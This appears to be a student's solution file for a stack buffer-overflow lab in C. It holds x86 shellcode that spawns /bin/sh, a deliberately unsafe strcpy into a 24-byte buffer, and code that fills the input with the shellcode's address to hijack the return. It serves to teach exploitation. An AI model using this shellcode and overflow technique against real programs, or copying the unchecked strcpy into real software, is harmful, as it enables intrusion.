/* stack-cp1.c */

/* This program has a buffer overflow vulnerability. */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char code[] =
  "\x31\xc0"             /* xorl    %eax,%eax              */
  "\x50"                 /* pushl   %eax                   */
  "\x68""//sh"           /* pushl   $0x68732f2f            */
  "\x68""/bin"           /* pushl   $0x6e69622f            */
  "\x89\xe3"             /* movl    %esp,%ebx              */
  "\x50"                 /* pushl   %eax                   */
  "\x53"                 /* pushl   %ebx                   */
  "\x89\xe1"             /* movl    %esp,%ecx              */
  "\x99"                 /* cdq                            */
  "\xb0\x0b"             /* movb    $0x0b,%al              */
  "\xcd\x80"             /* int     $0x80                  */
;

int bof(char *str)
{
    char buffer[24];
    printf("Address of buffer: %p\n", (void *)buffer);

    strcpy(buffer, str);

    return 1;
}


int main(int argc, char **argv)
{
    char b[100];
    FILE *badfile;

    printf("Address of code: %p\n", (void *)code);
    
    /* You need to fill the array b with appropriate contents here */
    /* Code HERE */
    int addr = code;
    int i=0;
    
    for(i=0; i < 41; i+=4){
      int *ptr = (int *)(b+i); //0
      *ptr = addr;
    }

    printf("String like %s\n", b);
    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    // // Hint: the second argument may not be 100
    fwrite(b, 41, 1, badfile); 
    fclose(badfile);
    
    // /* Read the contents from the file "badfile" */
    char str[100];
    badfile = fopen("badfile", "r");
    // Hint: the second argument may not be 100
    fread(str, sizeof(char), 41, badfile); 
    
    bof(str);

    printf("Returned Properly\n");
    return 1;
}
